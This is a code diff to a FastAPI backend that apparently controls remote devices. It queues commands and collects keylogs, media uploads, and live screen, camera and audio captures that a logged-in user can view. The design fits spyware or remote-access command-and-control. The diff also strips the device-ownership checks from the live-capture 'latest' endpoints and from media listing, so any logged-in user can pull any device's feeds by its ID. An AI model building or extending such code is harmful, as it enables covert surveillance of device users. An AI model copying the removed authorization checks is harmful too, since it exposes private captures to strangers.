@@ -13,10 +13,8 @@ from app.core import security
 from app.core.auth import get_current_user, get_current_device
 security.get_current_user = get_current_user
 security.verify_device_token = get_current_device
-security.get_current_device = get_current_device
 from datetime import timedelta
 from app.core.config import settings
-from app.services import r2_service
 from sqlalchemy.sql import func
 
 router = APIRouter()
@@ -255,7 +253,7 @@ def get_device_commands(db: Session = Depends(get_db), current_device: models.De
 def update_command_status(command_id: int, update: schemas.CommandStatusUpdate, db: Session = Depends(get_db), current_device: models.Device = Depends(get_current_device)):
     return crud.update_command_status(db=db, command_id=command_id, update=update)
 
-@router.post("/devices/me/media/upload/", response_model=schemas.MediaFileResponse)
+@router.post("/devices/me/media/upload/", response_model=schemas.MediaFile)
 def upload_media(file: UploadFile = File(...), db: Session = Depends(get_db), current_device: models.Device = Depends(get_current_device)):
     # fake upload
     filename = f"{uuid.uuid4()}_{file.filename}"
@@ -270,31 +268,9 @@ def send_command(device_id: int, command: schemas.CommandBase, db: Session = Dep
     cmd_create = schemas.CommandCreate(**command.dict(), device_id=device_id)
     return crud.create_command(db=db, command=cmd_create, user_id=current_user.id)
 
-@router.post("/media/presigned-put", response_model=schemas.PresignedPutResponse)
-def get_presigned_put(req: schemas.PresignedPutRequest, current_device: models.Device = Depends(security.get_current_device)):
-    safe_filename = os.path.basename(req.file_name)
-    key = f"devices/{current_device.id}/{uuid.uuid4()}_{safe_filename}"
-    url = r2_service.generate_presigned_put(key, req.file_type)
-    return {"upload_url": url, "s3_key": key}
-
-@router.post("/media/complete", response_model=schemas.MediaFileResponse)
-def complete_media_upload(req: schemas.MediaFileBase, db: Session = Depends(database.get_db), current_device: models.Device = Depends(security.get_current_device)):
-    media_create = schemas.MediaFileCreate(**req.dict(), device_id=current_device.id)
-    return crud.create_media_file(db, media_create, current_device.owner_id)
-
-@router.get("/devices/{device_id}/media", response_model=List[schemas.MediaFileResponse])
-def list_device_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(database.get_db), current_user: models.User = Depends(security.get_current_user)):
-    device = db.query(models.Device).filter(models.Device.id == device_id, models.Device.owner_id == current_user.id).first()
-    if not device:
-        raise HTTPException(status_code=403, detail="Not authorized to access media for this device")
-    items = crud.get_media_by_device(db, device_id, skip=skip, limit=limit)
-    res = []
-    for m in items:
-        validate_fn = getattr(schemas.MediaFileResponse, "model_validate", getattr(schemas.MediaFileResponse, "from_orm", None))
-        m_dict = validate_fn(m)
-        m_dict.url = r2_service.generate_presigned_get(m.s3_key)
-        res.append(m_dict)
-    return res
+@router.get("/devices/{device_id}/media/", response_model=List[schemas.MediaFile])
+def read_media(device_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db), current_user: models.User = Depends(get_current_user)):
+    return crud.get_media_by_device(db=db, device_id=device_id, skip=skip, limit=limit)
 
 @router.post("/devices/me/keylogs/", response_model=schemas.Keylog)
 def create_keylog_for_device(
@@ -314,7 +290,7 @@ def enqueue_command(
     cmd = models.Command(
         device_id=cmd_req.device_id,
         command=cmd_req.command,
-        status="pending",
+        status="PENDING",
         created_at=int(time.time() * 1000)
     )
     db.add(cmd)
@@ -322,19 +298,23 @@ def enqueue_command(
     db.refresh(cmd)
     return cmd
 
-latest_screen_frames: dict = {}
-latest_camera_frames: dict = {}
-latest_audio_chunks: dict = {}
-
 @router.post("/live-screen")
 def upload_live_screen_frame(
     file: UploadFile = File(...),
     timestamp: int = Form(...),
-    current_device: models.Device = Depends(security.get_current_device)
+    db: Session = Depends(database.get_db),
+    device: models.Device = Depends(security.verify_device_token)
 ):
     frame_bytes = file.file.read()
-    latest_screen_frames[current_device.id] = (frame_bytes, timestamp)
-    return {"status": "ok", "size": len(frame_bytes)}
+    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device.id).first()
+    if not frame:
+        frame = models.LiveScreenFrame(device_id=device.id, frame_data=frame_bytes, timestamp=timestamp)
+        db.add(frame)
+    else:
+        frame.frame_data = frame_bytes
+        frame.timestamp = timestamp
+    db.commit()
+    return {"status": "ok"}
 
 @router.get("/live-screen/latest")
 def get_latest_live_frame(
@@ -342,60 +322,65 @@ def get_latest_live_frame(
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
-    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
-    if not device:
-        raise HTTPException(status_code=403, detail="Not authorized")
-    entry = latest_screen_frames.get(device_id)
-    if not entry:
+    frame = db.query(models.LiveScreenFrame).filter(models.LiveScreenFrame.device_id == device_id).first()
+    if not frame or not frame.frame_data:
         return Response(status_code=404)
-    data, ts = entry
-    return Response(content=data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(ts)})
+    return Response(content=frame.frame_data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(frame.timestamp)})
 
 @router.post("/live-camera")
 def upload_live_camera_frame(
     file: UploadFile = File(...),
-    current_device: models.Device = Depends(security.get_current_device)
+    timestamp: int = Form(...),
+    db: Session = Depends(database.get_db),
+    device: models.Device = Depends(security.verify_device_token)
 ):
-    data = file.file.read()
-    latest_camera_frames[current_device.id] = (data, time.time())
-    return {"status": "ok", "size": len(data)}
+    frame_bytes = file.file.read()
+    frame = db.query(models.LiveCameraFrame).filter(models.LiveCameraFrame.device_id == device.id).first()
+    if not frame:
+        frame = models.LiveCameraFrame(device_id=device.id, frame_data=frame_bytes, timestamp=timestamp)
+        db.add(frame)
+    else:
+        frame.frame_data = frame_bytes
+        frame.timestamp = timestamp
+    db.commit()
+    return {"status": "ok"}
 
 @router.get("/live-camera/latest")
-def get_latest_camera_frame(
+def get_latest_live_camera(
     device_id: int,
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
-    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
-    if not device:
-        raise HTTPException(status_code=403, detail="Not authorized")
-    entry = latest_camera_frames.get(device_id)
-    if not entry:
-        raise HTTPException(status_code=404, detail="No camera frame available")
-    data, ts = entry
-    return Response(content=data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(ts)})
+    frame = db.query(models.LiveCameraFrame).filter(models.LiveCameraFrame.device_id == device_id).first()
+    if not frame or not frame.frame_data:
+        return Response(status_code=404)
+    return Response(content=frame.frame_data, media_type="image/jpeg", headers={"X-Frame-Timestamp": str(frame.timestamp)})
 
 @router.post("/live-audio")
-def upload_live_audio_chunk(
+def upload_live_audio_frame(
     file: UploadFile = File(...),
-    current_device: models.Device = Depends(security.get_current_device)
+    timestamp: int = Form(...),
+    db: Session = Depends(database.get_db),
+    device: models.Device = Depends(security.verify_device_token)
 ):
-    data = file.file.read()
-    latest_audio_chunks[current_device.id] = (data, time.time())
-    return {"status": "ok", "size": len(data)}
+    frame_bytes = file.file.read()
+    frame = db.query(models.LiveAudioFrame).filter(models.LiveAudioFrame.device_id == device.id).first()
+    if not frame:
+        frame = models.LiveAudioFrame(device_id=device.id, frame_data=frame_bytes, timestamp=timestamp)
+        db.add(frame)
+    else:
+        frame.frame_data = frame_bytes
+        frame.timestamp = timestamp
+    db.commit()
+    return {"status": "ok"}
 
 @router.get("/live-audio/latest")
-def get_latest_audio_chunk(
+def get_latest_live_audio(
     device_id: int,
     db: Session = Depends(database.get_db),
     current_user: models.User = Depends(security.get_current_user)
 ):
-    device = crud.get_device_by_id_and_owner(db, device_id, current_user.id)
-    if not device:
-        raise HTTPException(status_code=403, detail="Not authorized")
-    entry = latest_audio_chunks.get(device_id)
-    if not entry:
-        raise HTTPException(status_code=404, detail="No audio chunk available")
-    data, ts = entry
-    return Response(content=data, media_type="audio/aac", headers={"X-Frame-Timestamp": str(ts)})
-
+    frame = db.query(models.LiveAudioFrame).filter(models.LiveAudioFrame.device_id == device_id).first()
+    if not frame or not frame.frame_data:
+        return Response(status_code=404)
+    return Response(content=frame.frame_data, media_type="audio/aac", headers={"X-Frame-Timestamp": str(frame.timestamp)})
